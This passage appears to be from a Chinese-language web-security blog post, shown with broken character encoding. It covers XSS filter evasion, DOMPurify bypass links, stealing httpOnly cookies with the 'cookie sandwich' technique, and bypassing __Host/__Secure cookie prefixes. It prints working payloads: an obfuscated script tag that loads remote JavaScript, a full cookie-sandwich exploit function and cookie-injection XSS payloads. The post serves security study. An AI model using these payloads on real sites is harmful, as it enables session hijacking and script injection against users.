class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åå…­è¿›åˆ¶å­—ç¬¦ä¸²ç”Ÿæˆï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span> <span class="token string">"&lt;sCrIpt srC=//xs.sb/YTUh>&lt;/sCRipT>"</span>res <span class="token operator">=</span> <span class="token string">''</span>res2 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span>  tmp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>  res <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>  res<span class="token operator">+=</span><span class="token string">","</span>  res2 <span class="token operator">+=</span><span class="token string-interpolation"><span class="token string">f"document.write(String.fromCharCode(</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">));"</span></span><span class="token comment"># print(res)</span><span class="token comment"># print(res2)</span><span class="token comment">#-------------ç”Ÿæˆè„šæœ¬åˆ†ä¸ºä¸Šä¸‹2ä¸ªï¼Œä¸Šé¢çš„æ˜¯ç”Ÿæˆæ²¡è¿‡æ»¤.çš„è„šæœ¬---------------</span>a <span class="token operator">=</span> <span class="token string">"646f63756d656e742e777269746528537472696e672e66726f6d43686172436f64652836302c3131352c36372c3131342c37332c3131322c3131362c33322c3131352c3131342c36372c36312c34372c34372c3132302c3131352c34362c3131352c39382c34372c38392c38342c38352c3130342c36322c36302c34372c3131352c36372c38322c3130352c3131322c38342c363229293b"</span>z <span class="token operator">=</span> <span class="token number">0</span>res <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span>  <span class="token keyword">if</span> z <span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>    z<span class="token operator">=</span><span class="token number">0</span>  <span class="token keyword">if</span> z <span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>    res<span class="token operator">+=</span><span class="token string">r"\x"</span>  res <span class="token operator">+=</span> i  z<span class="token operator">+=</span><span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="ç»„ä»¶é˜²æŠ¤ç»•è¿‡"><a href="#ç»„ä»¶é˜²æŠ¤ç»•è¿‡" class="headerlink" title="ç»„ä»¶é˜²æŠ¤ç»•è¿‡"></a>ç»„ä»¶é˜²æŠ¤ç»•è¿‡</h1><h2 id="DOMPurify"><a href="#DOMPurify" class="headerlink" title="DOMPurify"></a>DOMPurify</h2><p>bypass version &lt; 3.2.4ï¼š</p><p><a href="https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-8722251">https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-8722251</a></p><p><a href="https://ensy.zip/posts/dompurify-323-bypass/">https://ensy.zip/posts/dompurify-323-bypass/</a></p><p>DOMPurify å…è®¸ img æ ‡ç­¾</p><p><a href="https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists">https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists</a></p><hr><h1 id="åŸç”Ÿé˜²æŠ¤ç»•è¿‡"><a href="#åŸç”Ÿé˜²æŠ¤ç»•è¿‡" class="headerlink" title="åŸç”Ÿé˜²æŠ¤ç»•è¿‡"></a>åŸç”Ÿé˜²æŠ¤ç»•è¿‡</h1><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p>è§å¦ä¸€ç¯‡åšå®¢ <a href="/blog/2023/12/12/CSP/">ã€ŠCSPã€‹</a></p><hr><h2 id="httpOnly"><a href="#httpOnly" class="headerlink" title="httpOnly"></a>httpOnly</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Guides/Cookies">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Guides/Cookies</a></p><blockquote><p>JavaScriptÂ <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie"><code>Document.cookie</code></a>Â API æ— æ³•è®¿é—®å¸¦æœ‰Â <code>HttpOnly</code>Â å±æ€§çš„ cookie</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´å¯¹ xss å¸¦å‡º cookie é€ æˆäº†é™åˆ¶</p><h3 id="cookie-sandwich-technique"><a href="#cookie-sandwich-technique" class="headerlink" title="cookie sandwich technique"></a>cookie sandwich technique</h3><p><a href="https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique">https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique</a></p><h4 id="é™çº§-cookie-è§£æå™¨"><a href="#é™çº§-cookie-è§£æå™¨" class="headerlink" title="é™çº§ cookie è§£æå™¨"></a>é™çº§ cookie è§£æå™¨</h4><p><a href="https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie">https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie</a></p><p>å…³äº http cookie çš„æ ‡å‡†ï¼Œç¬¬ä¸€ä¸ªæ˜¯ RFC 2109ï¼ˆå°½ç®¡ç°ä»£æµè§ˆå™¨ä¸æ”¯æŒï¼Œä½†æ˜¯è®¸å¤š web æœåŠ¡å™¨ä»ç„¶æ”¯æŒï¼‰ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">$Version=1; foo="bar"; $Path="/"; $Domain=abc;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>$Version</code> æ˜¯å¿…é¡»æŒ‡å®šçš„å±æ€§ï¼Œç”¨äºæ ‡è¯† cookie è§„èŒƒçš„ç‰ˆæœ¬ï¼Œè€Œ <code>$Version=1</code> è¿™ä¸ªæ ‡å‡†ä¸‹ï¼Œåœ¨ç”¨<strong>åŒå¼•å·æ‹¬èµ·æ¥</strong>æ—¶ï¼Œä¸€ä¸ª cookie å€¼å¯ä»¥åŒ…å«ç©ºæ ¼ã€åˆ†å·å’Œç­‰å·</p><p>ç°ä»£è¯­è¨€æ¡†æ¶ä¸­å¯¹ cookie å¤´çš„è§£æï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">Flask<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"foo"</span><span class="token operator">:</span><span class="token string">"bar"</span><span class="token punctuation">,</span><span class="token property">"$Version"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"$Path"</span><span class="token operator">:</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token property">"$Domain"</span><span class="token operator">:</span><span class="token string">"abc"</span><span class="token punctuation">&#125;</span>Django<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"foo"</span><span class="token operator">:</span><span class="token string">"bar"</span><span class="token punctuation">,</span><span class="token property">"$Version"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"$Path"</span><span class="token operator">:</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token property">"$Domain"</span><span class="token operator">:</span><span class="token string">"abc"</span><span class="token punctuation">&#125;</span>PHP<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"foo"</span><span class="token operator">:</span><span class="token string">"\"bar\""</span><span class="token punctuation">,</span><span class="token property">"$Version"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"$Path"</span><span class="token operator">:</span><span class="token string">"\"\/\""</span><span class="token punctuation">,</span><span class="token property">"$Domain"</span><span class="token operator">:</span><span class="token string">"abc"</span><span class="token punctuation">&#125;</span>Ruby<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"foo"</span><span class="token operator">:</span><span class="token string">"\"bar\""</span><span class="token punctuation">,</span><span class="token property">"$Version"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"$Path"</span><span class="token operator">:</span><span class="token string">"\"\/\""</span><span class="token punctuation">,</span><span class="token property">"$Domain"</span><span class="token operator">:</span><span class="token string">"abc"</span><span class="token punctuation">&#125;</span>Spring<span class="token operator">:</span><span class="token punctuation">&#123;</span> <span class="token property">"foo"</span><span class="token operator">:</span> <span class="token string">"\"bar\""</span><span class="token punctuation">&#125;</span>SimpleCookie<span class="token operator">:</span><span class="token punctuation">&#123;</span> <span class="token property">"foo"</span><span class="token operator">:</span> <span class="token string">"bar"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾ˆæ˜æ˜¾å®ƒä»¬çš„è§£ææ–¹å¼å¹¶æ²¡æœ‰ç»Ÿä¸€</p><p>åœ¨ SpringBoot 2 + Apache Tomcat v.9.0.83 ä¸­ï¼Œå¯¹äº cookie çš„å¤„ç†æ–¹å¼å¦‚ä¸‹ï¼š</p><ul><li>èƒ½å¤Ÿå¤„ç† RFC6265 å’Œ RFC2109 ï¼Œå¦‚æœå­—ç¬¦ä¸²ä»¥ <code>$Version</code> å±æ€§å¼€å¤´ï¼Œåˆ™é»˜è®¤ä½¿ç”¨æ—§ç‰ˆè§£æé€»è¾‘</li><li>å¦‚æœ cookie å€¼ä»¥åŒå¼•å·å¼€å¤´ï¼Œå®ƒå°†ç»§ç»­è¯»å–å­—ç¬¦ç›´åˆ°ä¸‹ä¸€ä¸ªæœªè½¬ä¹‰çš„åŒå¼•å·ï¼Œå³å€¼ä¸ºåŒå¼•å·æ‹¬èµ·æ¥çš„å†…å®¹ã€‚</li><li>æ”¯æŒ <code>$Path</code> å’Œ <code>$Domain</code> å±æ€§ï¼Œå¦‚æœåœ¨å“åº”ä¹‹å‰æœªæ­£ç¡®æ£€æŸ¥åå°„çš„ cookie å±æ€§ï¼Œåˆ™å¯èƒ½å…è®¸ç”¨æˆ·æ›´æ”¹åå°„çš„ cookie å±æ€§ï¼Œå¹¶ä¸”è§£æå™¨å°†å–æ¶ˆè½¬ä¹‰ä»»ä½•ä»¥åæ–œæ  ï¼ˆ\ï¼‰ å¼€å¤´çš„å­—ç¬¦</li></ul><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">$Version=1; foo="\b\a\r"; $Path=/abc; $Domain=example.com</span></span><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">foo="bar"; Path=/abc; Domain=example.com</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°åŸå…ˆçš„ <code>\b\a\r</code> è¢«é‡æ–°è®¾ç½®ä¸ºäº† <code>bar</code>ï¼Œåœ¨ç»•è¿‡ waf ä¸Šåˆè§ç«¯å€ª</p><br><p>åœ¨ Python çš„ SimpleCookie ä¸­ï¼Œé”®å€¼å¯¹æ”¯æŒæ—§ç‰ˆ cookie å±æ€§ï¼Œé‚£ä¹ˆå°±å’Œä¸Šé¢ä¸€æ ·å¯ä»¥æ³¨å…¥æ—§ç‰ˆ cookie å±æ€§æ¥å–æ¶ˆè½¬ä¹‰ç»•è¿‡æŸäº›é™åˆ¶ã€‚</p><p>è€Œæ‰€æœ‰åŸºäº Python çš„æ¡†æ¶ï¼ˆFlaskã€Django ç­‰ï¼‰éƒ½å…è®¸å¸¦å¼•å·çš„ cookie å€¼ï¼Œä½†æ˜¯æ— æ³•è¯†åˆ« <code>$Version</code> ä¸€ç±»çš„ magic stringï¼Œä¼šå°†å…¶è§†ä¸ºæ™®é€šçš„ cookie åï¼Œå¹¶ä¸”ä¼šè‡ªåŠ¨è§£ç å¸¦å¼•å·çš„å­—ç¬¦ä¸²ä¸­çš„å…«è¿›åˆ¶è½¬ä¹‰åºåˆ—ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">"\012"</span> <span class="token operator">&lt;=</span><span class="token operator">></span> \n  <span class="token string">"\015"</span> <span class="token operator">&lt;=</span><span class="token operator">></span> \r  <span class="token string">"\073"</span> <span class="token operator">&lt;=</span><span class="token operator">></span> <span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><em>å®é™…ç»•è¿‡ waf çš„åˆ©ç”¨åœ¨å‚è€ƒæ–‡ç« ä¸­è®²å¾—å¾ˆæ˜ç™½äº†ï¼Œæˆ‘ä»¬çš„é¦–è¦ç›®æ ‡æ˜¯è§£å†³ httpOnlyï¼Œæ‰€ä»¥ç•¥è¿‡</em></p><hr><h4 id="Cookie-sandwich"><a href="#Cookie-sandwich" class="headerlink" title="Cookie sandwich"></a>Cookie sandwich</h4><p>ç°ä»£çš„ Chrome æµè§ˆå™¨ï¼ˆåŒ…æ‹¬ xssbot åœ¨å†…ï¼‰ä¸æ”¯æŒæ—§ç‰ˆ cookieï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥åˆ›å»ºä»¥ <code>$</code> å¼€å¤´çš„ Cookie åç§°ï¼Œä¾‹å¦‚ <code>$Version</code>ï¼Œæµè§ˆå™¨åªä¼šè§†ä¸ºæ™®é€šå­—ç¬¦ä¸²ï¼›è€Œå‰é¢æè¿‡ï¼Œæ—§ç‰ˆ cookie æ”¯æŒ<strong>åŒå¼•å·æ‹¬èµ·æ¥</strong>çš„éƒ¨åˆ†ä¸ºæ•´ä¸ªå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ„é€ ä¸‹é¢è¿™æ ·ä¸€ä¸ª cookieï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">$Version=1;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">param1="start</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span><span class="token comment">// any cookies inside the sandwich will be placed into param1 value server-side</span>document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">param2=end";</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶çš„è¯·æ±‚å’Œå“åº”ä¼šå˜æˆè¿™æ ·ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">$Version=1; param1="start; sessionId=secret; param2=end"</span></span><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">param1="start; sessionId=secret; param2=end";</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°å“åº”çš„ cookie æ˜¯ param1 ï¼Œå…¶å€¼ä¸º <code>start; sessionId=secret; param2=end</code></p><p>å¦‚æœåº”ç”¨ç¨‹åºåœ¨å“åº”ä¸­èƒ½å¤Ÿè¿”å›ä¸€ä¸ªå¯æ§çš„ cookie é”®å¦‚è¿™é‡Œçš„ param1 æˆ–è€…æ²¡æœ‰è®¾ç½® httpOnlyï¼Œé‚£ä¹ˆå³ä½¿æ˜¯ httpOnly ä¼šè¯é‡Œçš„æ•´ä¸ª cookie éƒ½å¯ä»¥è¢«æ‹¬èµ·æ¥è§†ä¸ºå­—ç¬¦ä¸²å…¬å¼€å‡ºæ¥</p><p>expï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">sandwich</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> cookie</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Step 1: Create an iframe with target src and wait for it</span>    <span class="token keyword">const</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> domain <span class="token operator">=</span> url<span class="token punctuation">.</span>hostname<span class="token punctuation">;</span>    <span class="token keyword">const</span> path <span class="token operator">=</span> url<span class="token punctuation">.</span>pathname<span class="token punctuation">;</span>    iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> target<span class="token punctuation">;</span>    <span class="token comment">// Hide the iframe</span>    iframe<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'none'</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Optional: Add your code to check and clean client's cookies if needed</span>    iframe<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Step 2: Create cookie gadget</span>        document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">$Version=1; domain=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>domain<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">; path=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>path<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>        document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>cookie<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">="deadbeef; domain=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>domain<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">; path=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>path<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>        document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">dummy=qaz"; domain=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>domain<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">; path=/;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>        <span class="token comment">// Step 3: Send a fetch request</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>target<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>                <span class="token literal-property property">credentials</span><span class="token operator">:</span> <span class="token string">'include'</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> responseData <span class="token operator">=</span> <span class="token keyword">await</span> response<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Step 4: Alert response</span>            <span class="token function">alert</span><span class="token punctuation">(</span>responseData<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error fetching data:'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">setTimeout</span><span class="token punctuation">(</span>sandwich<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token string">'http://example.com/json'</span><span class="token punctuation">,</span> <span class="token string">'session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="Host-amp-Secure-Prefix"><a href="#Host-amp-Secure-Prefix" class="headerlink" title="__Host &amp; __Secure Prefix"></a>__Host &amp; __Secure Prefix</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Reference/Headers/Set-Cookie">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Reference/Headers/Set-Cookie</a></p><p><a href="https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes">https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes</a></p><p><strong><code>__Host-</code>Â å‰ç¼€</strong>ï¼šä»¥Â <code>__Host-</code>Â ä¸ºå‰ç¼€çš„ cookieï¼Œå¿…é¡»ä¸Â <code>secure</code>Â æ ‡å¿—ä¸€åŒè®¾ç½®ï¼Œå¿…é¡»åº”ç”¨äºå®‰å…¨é¡µé¢ï¼ˆHTTPSï¼‰ï¼Œä¹Ÿç¦æ­¢æŒ‡å®š domain å±æ€§ï¼ˆä¹Ÿå°±ä¸ä¼šå‘é€ç»™å­åŸŸåï¼Œå³ä¸èƒ½è·¨å­åŸŸå…±äº«ï¼‰ï¼ŒåŒæ—¶ path å±æ€§çš„å€¼å¿…é¡»ä¸ºÂ <code>/</code>ã€‚</p><p><strong><code>__Secure-</code>Â å‰ç¼€</strong>ï¼šä»¥Â <code>__Secure-</code>Â ä¸ºå‰ç¼€çš„ cookieï¼ˆè¿æ¥ç¬¦æ˜¯å‰ç¼€çš„ä¸€éƒ¨åˆ†ï¼‰ï¼Œå¿…é¡»ä¸Â <code>secure</code>Â æ ‡å¿—ä¸€åŒè®¾ç½®ï¼ŒåŒæ—¶å¿…é¡»åº”ç”¨äºå®‰å…¨é¡µé¢ï¼ˆHTTPSï¼‰ã€‚</p><p>è¿™ä¸¤ä¸ªé™åˆ¶ç”±æµè§ˆå™¨å¼ºåˆ¶æ‰§è¡Œï¼Œä»¥é˜²æ­¢ cookie tossing ï¼ˆå­åŸŸååœ¨çˆ¶åŸŸåä¸Šè®¾ç½® cookieï¼‰æˆ–ä¼šè¯å›ºå®šç­‰æ”»å‡»</p><p>ä½†æ˜¯æ ¹æ®Â <a href="https://datatracker.ietf.org/doc/html/rfc6265#:~:text=NOTE%3A%20Despite%20its,valid%20UTF%2D8.">RFC 6265</a>ï¼Œcookie å¤´è¢«å®šä¹‰ä¸ºå…«è¿›åˆ¶çš„å­—èŠ‚åºåˆ—ï¼Œè€Œä¸æ˜¯å­—ç¬¦ã€‚è¿™æ„å‘³ç€æµè§ˆå™¨é€šè¿‡ç½‘ç»œå‘é€åŸå§‹å­—èŠ‚ï¼ŒæœåŠ¡å™¨è´Ÿè´£å°†è¿™äº›å­—èŠ‚è§£ç ä¸ºå­—ç¬¦ä¸²ã€‚å¦‚æœæµè§ˆå™¨å’ŒæœåŠ¡å™¨ä»¥ä¸åŒçš„æ–¹å¼è§£é‡Šè¿™äº›å­—èŠ‚ï¼Œåˆ™å¯èƒ½ä¼šå‡ºç°è§£æå·®å¼‚ã€‚</p><h3 id="unicode-ç©ºæ ¼"><a href="#unicode-ç©ºæ ¼" class="headerlink" title="unicode ç©ºæ ¼"></a>unicode ç©ºæ ¼</h3><p>ç»“è®ºï¼šé€šè¿‡ä½¿ç”¨ UTF-8 ç¼–ç ï¼Œæ”»å‡»è€…å¯ä»¥ç»•è¿‡å¦‚ <code>__Host</code> å‰ç¼€è¿™ç§é€šè¿‡æµè§ˆå™¨çš„ä¿æŠ¤ï¼Œä»è€Œä¼ªè£…å—é™åˆ¶çš„ cookieã€‚æµè§ˆå™¨ä¼šå°†å…¶è§£é‡Šä¸ºä¸å—é™åˆ¶çš„ cookieï¼Œè€ŒæœåŠ¡å™¨èƒ½å¤Ÿå°†å…¶è§£é‡Šä¸ºå—ä¿æŠ¤çš„ cookie</p><p>pocï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span>cookie<span class="token operator">=</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>String<span class="token punctuation">.</span><span class="token function">fromCodePoint</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">__Host-name=injected; Domain=.example.com; Path=/;</span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ­¤å¤„æ˜¯ä¸€ä¸ªç©ºæ ¼åœ¨ __Host-name å‰ï¼Œæµè§ˆå™¨ä¼šè§£é‡Šä¸ºæ— å‰ç¼€ã€æ— é™åˆ¶çš„å€¼ï¼Œäºæ˜¯å°±ä¼šå‘åˆ°å…¶å­åŸŸ</p><p>æŸäº›æœåŠ¡å™¨ç«¯æ¡†æ¶ï¼Œä¾‹å¦‚ Django å’Œ ASP.NETï¼Œä¼šè§„èŒƒå¤„ç† cookieï¼Œå½“æœåŠ¡å™¨å°† U+2000 è§£é‡Šä¸ºç©ºæ ¼å­—ç¬¦æ—¶ï¼Œå®ƒä¼šå°†å…¶åˆ é™¤ï¼Œä»è€Œç”Ÿæˆç­‰æ•ˆäº __Host-name çš„ cookie åç§°ã€‚</p><h3 id="æ—§ç‰ˆè§£æ"><a href="#æ—§ç‰ˆè§£æ" class="headerlink" title="æ—§ç‰ˆè§£æ"></a>æ—§ç‰ˆè§£æ</h3><p>å³ä¸Šé¢æåˆ°çš„é™çº§ cookie è§£æå™¨çš„æ–¹æ³•</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span>cookie<span class="token operator">=</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">$Version=1,__Host-name=injected; Path=/somethingreallylong/; Domain=.example.com;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯"></a>åœºæ™¯</h3><p>å‘ç°äº†å­˜å‚¨å‹ XSSï¼Œä½†æ˜¯åœ¨å­åŸŸä¸Šï¼Œç›®æ ‡æ˜¯è¦†ç›–çˆ¶åŸŸä¸Šçš„ cookie</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span>cookie<span class="token operator">=</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>String<span class="token punctuation">.</span><span class="token function">fromCodePoint</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">__Host-name=&lt;img src=x onerror=alert(1)>; Domain=example.com; Path=/;</span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶æµè§ˆå™¨å‘é€çš„æ ‡å¤´</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">__Host-name=Carlos; Ã¢â‚¬â‚¬__Host-name=&lt;img src=x onerror=alert(1)>;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åç«¯å¾€å¾€ä¼šæŠŠåŒåæœ€åå‡ºç°çš„ä¸€ä¸ªå€¼ä½œä¸ºå¯¹åº” cookie çš„å€¼ï¼Œé‚£ä¹ˆæ­¤æ—¶å°±æ˜¯æˆ‘ä»¬çš„ payload</p>]]></content>
    
    
